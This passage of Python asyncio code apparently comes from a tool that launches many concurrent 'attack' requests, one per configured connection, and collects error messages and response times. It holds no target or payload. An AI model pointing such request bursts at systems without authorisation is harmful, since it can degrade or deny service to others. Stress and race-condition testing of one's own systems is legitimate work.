                        "error": str(e),
                        "response_time_ms": (time.time() - start) * 1000,
                    }
            
            attack_tasks = [attack_request(i) for i in range(self.connections)]
            results = await asyncio.gather(*attack_tasks)
            
            return results
